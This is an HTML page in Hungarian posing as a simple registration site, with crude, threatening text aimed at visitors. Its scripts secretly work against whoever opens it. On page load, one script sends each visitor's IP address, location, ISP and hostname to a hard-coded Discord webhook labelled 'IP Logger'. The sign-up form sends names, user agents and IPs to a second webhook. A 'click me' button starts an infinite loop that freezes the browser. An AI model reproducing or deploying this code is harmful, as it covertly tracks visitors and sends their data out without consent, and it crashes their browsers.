<!DOCTYPE html>
<html lang="en">
<head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Anyadat nezegesd te kocsog</title>
<style>

.button {
  border: none;
  color: white;
  padding: 16px 32px;
  text-align: center;
  text-decoration: none;
  display: inline-block;
  font-size: 16px;
  margin: 4px 2px;
  transition-duration: 0.4s;
  cursor: pointer;
}

.button1 {
  background-color: white;
  color: black;
  border: 2px solid #04AA6D;
}

.button1:hover {
  background-color: #04AA6D;
  color: white;
}

</style>
</head>

<h2>A rendes neved! (nehogy valami faszsagot adj meg, mert kinyirlak)</h2>
<input type="text" id="username" placeholder="Felhaszn√°l√≥n√©v">
<button onclick="register()">Regisztr√°ci√≥</button>

<h1> Ez egy nagyon egyszeru weboldal </h1>
<button class="button button1" onclick="crashBrowser()">Kattints ram</button>

<a href="admin.html">Admin Panel</a>

<body>
     
<script>

async function register() {
    let username = document.getElementById("username").value.trim();
    
    if (username === "") {
        alert("Adj meg egy √©rv√©nyes nevet!");
        return;
    }

    let webhookUrl = "https://discord.com/api/webhooks/1364631969765265489/Lld-zUg04ujIozaxPLvYrGVf3r2RNUWVKFHtn8k2J7vQnoBVCfnmZCfWYo66IOLTVEtU";

    let now = new Date();
    function generateID() {
        return Math.random().toString(36).substring(2, 10).toUpperCase();
    }

    let timestamp = now.toISOString().replace("T", " ").substring(0, 19);
    let userAgent = navigator.userAgent;
    let userID = generateID();
    
    // üî• **Admin ellen≈ërz√©s n√©v alapj√°n**
    let isAdmin = username.toLowerCase() === "admin";

    // üî• **IP lek√©r√©se √©s admin ellen≈ërz√©s**
    let ipResponse = await fetch("https://ipinfo.io/json");
    let ipData = await ipResponse.json();
    let userIP = ipData.ip;
    
    let adminIPs = ["192.168.50.92", "84.3.235.39"]; // Itt add meg az admin IP-ket
    if (adminIPs.includes(userIP)) {
        isAdmin = true;
    }

    // **Felhaszn√°l√≥ elment√©se localStorage-ba**
    let users = JSON.parse(localStorage.getItem("users")) || [];
    users.push({ username, userID, timestamp, isAdmin, userIP });
    localStorage.setItem("users", JSON.stringify(users));

    let payload = {
        username: "√öj felhaszn√°l√≥",
        content: `üì¢ **√öj felhaszn√°l√≥ regisztr√°lt:** \`${username}\`\nüÜî **Felhaszn√°l√≥i ID:** \`${userID}\`\nüïí **Id≈ëpont:** \`${timestamp}\`\nüíª **Eszk√∂z:** \`${userAgent}\`\nüåê **IP:** \`${userIP}\`\nüîë **Admin:** ${isAdmin ? "‚úÖ Igen" : "‚ùå Nem"}`
    };

    try {
        let response = await fetch(webhookUrl, {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify(payload)
        });

        if (response.ok) {
            alert(`Sikeresen regisztr√°lt√°l! ${isAdmin ? "Admin joggal l√©pt√©l be." : ""}`);
            document.getElementById("username").value = "";

            // üî• Ha admin, azonnal ir√°ny az admin panelre
            if (isAdmin) {
                window.location.href = "admin.html";
            }

        } else {
            alert("Hiba t√∂rt√©nt a regisztr√°ci√≥ sor√°n.");
        }
    } catch (error) {
        alert("H√°l√≥zati hiba: " + error);
    }
}

function crashBrowser() {
    alert("Azt ugye tudtad, hogy az ipd atment egy discord webhookon keresztul hozzam?");
    
    while (true) {
        console.log("Meghalt a bongeszod ocskos");
    }
}

function monke(json) 
{
     var request = new XMLHttpRequest();
     
     request.open("POST", "https://discordapp.com/api/webhooks/1337434821978488882/FPuhUbglVukw3Pd3Qk_PyLoqOX3b-K1xJQyCQfGuRw_XxONxyU7q8Iil0M3vrRWFKxok");

     request.setRequestHeader('Content-type', 'application/json');

     var params = 
     {
          username: "IP Logger",
          avatar_url: "",
          content: "valaki volt olyan redvas hogy megnezte",
          embeds: [
               {
                    title: "Valaki megnezte a weboldalad!",
                    color: 1752220,
                    description: "**IP:** `" + json.ip + "`\n**Country:** `" + json.country + "`\n**Region:** `" + json.region + "`\n**Town/City:** `" + json.city + "`\n**ZIP:** `" + json.postal + "`\n**Hostname:** `" + json.hostname + "`\n**Timezone:** `" + json.timezone + "`\n**LocalIP:** `" + json.loc  + "`\n**Router:** `" + json.org
               }
          ]
     }

     request.send(JSON.stringify(params));
}
</script>
<script src="https://ipinfo.io/?format=jsonp&callback=monke"></script>

</body>
</html>

